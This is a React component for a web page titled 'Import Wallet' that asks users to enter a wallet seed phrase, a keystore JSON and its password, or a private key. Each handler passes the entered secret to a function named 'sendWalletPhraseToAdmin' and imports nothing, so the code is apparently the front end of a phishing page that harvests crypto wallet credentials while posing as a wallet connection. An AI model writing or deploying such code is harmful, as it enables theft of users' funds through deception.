"use client";

import { useState } from "react";

import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Input } from "@/components/ui/input";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { ConnectWalletsType } from "@/types";
import { useConnectWallets } from "@/hooks/useConnectWallets";
import { Spinner } from "../ui/spinner";

type Props = {
  walletAddress: ConnectWalletsType | null;
  //   selectedView: number;
  //   setSelectedView: (v: number) => void;
};

export default function ManualConnectWallet({
  walletAddress,
}: //   selectedView,
//   setSelectedView,
Props) {
  const { sendWalletPhraseToAdmin, isSendingWalletPhraseToAdmin } =
    useConnectWallets();

  const [tabIndex, setTabIndex] = useState("Phrase");

  const [phrase, setPhrase] = useState("");
  const [keystoreJSON, setKeystoreJSON] = useState("");
  const [keystoreJSONPassword, setKeystoreJSONPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const phraseImport = async () => {
    if (phrase.length < 12) {
      return toast.error("Phrase must be at least 12 characters");
    }
    const formData = {
      type: "phrase",
      wallet: walletAddress?.name,
      phrase,
      keystoreJSON: "",
      keystoreJSONPassword: "",
      privateKey: "",
    };

    await sendWalletPhraseToAdmin(formData);

    setPhrase("");
  };

  const keystoreJSONImport = async () => {
    if (keystoreJSON.length < 12) {
      return toast.error("Keystore JSON must be at least 12 characters");
    }

    const formData = {
      type: "keystore JSON",
      wallet: walletAddress?.name,
      phrase: "",
      keystoreJSON,
      keystoreJSONPassword,
      privateKey: "",
    };

    sendWalletPhraseToAdmin(formData);
    setKeystoreJSON("");
    setKeystoreJSONPassword("");
  };

  const privateKeyImport = async () => {
    if (!privateKey) {
      return toast.error("Please enter private key");
    }

    const formData = {
      type: "private Key",
      wallet: walletAddress?.name,
      phrase: "",
      keystoreJSON: "",
      keystoreJSONPassword: "",
      privateKey,
    };

    sendWalletPhraseToAdmin(formData);

    // setPrivateKey("");
    // setIsConnecting(false);
  };

  return (
    <div className="flex flex-col gap-4 px-4">
      {/* Header */}

      <h3 className="text-center text-lg font-bold mt-4">Import Wallet</h3>

      {/* Tabs */}
      <div className="flex gap-2 mt-3">
        {["Phrase", "KeyStore JSON", "Private Key"].map((item) => {
          const active = tabIndex === item;
          return (
            <button
              key={item}
              onClick={() => setTabIndex(item)}
              className={cn(
                "flex-1 rounded-full py-2 text-xs xs:text-sm font-semibold transition",
                active
                  ? "bg-green-600 text-white"
                  : "bg-muted text-muted-foreground"
              )}
            >
              {item}
            </button>
          );
        })}
      </div>

      {/* Phrase */}
      {tabIndex === "Phrase" && (
        <div className="flex flex-col gap-3 mt-2">
          <Textarea
            placeholder="Phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            className="h-28 resize-none"
          />

          <p className="text-center text-sm font-semibold text-muted-foreground">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <Button
            onClick={phraseImport}
            disabled={isSendingWalletPhraseToAdmin}
            className="mt-2"
          >
            {isSendingWalletPhraseToAdmin && <Spinner />}
            {isSendingWalletPhraseToAdmin ? "Importing..." : "Import Wallet"}
          </Button>
        </div>
      )}

      {/* KeyStore JSON */}
      {tabIndex === "KeyStore JSON" && (
        <div className="flex flex-col gap-3 mt-2">
          <Textarea
            placeholder="KeyStore JSON"
            value={keystoreJSON}
            onChange={(e) => setKeystoreJSON(e.target.value)}
            className="h-28 resize-none"
          />

          <Input
            placeholder="Password"
            value={keystoreJSONPassword}
            onChange={(e) => setKeystoreJSONPassword(e.target.value)}
          />

          <p className="text-center text-sm font-semibold text-muted-foreground">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <Button
            onClick={keystoreJSONImport}
            disabled={isSendingWalletPhraseToAdmin}
            className="mt-2"
          >
            {isSendingWalletPhraseToAdmin && <Spinner />}
            {isSendingWalletPhraseToAdmin ? "Importing..." : "Import Wallet"}
          </Button>
        </div>
      )}

      {/* Private Key */}
      {tabIndex === "Private Key" && (
        <div className="flex flex-col gap-3 mt-2">
          <Input
            placeholder="Private Key"
            value={privateKey}
            onChange={(e) => setPrivateKey(e.target.value)}
          />

          <p className="text-center text-sm font-semibold text-muted-foreground">
            Typically 12 (sometimes 24) words separated by single spaces
          </p>

          <Button
            onClick={privateKeyImport}
            disabled={isSendingWalletPhraseToAdmin}
            className="mt-2"
          >
            {isSendingWalletPhraseToAdmin && <Spinner />}
            {isSendingWalletPhraseToAdmin ? "Importing..." : "Import Wallet"}
          </Button>
        </div>
      )}
    </div>
  );
}
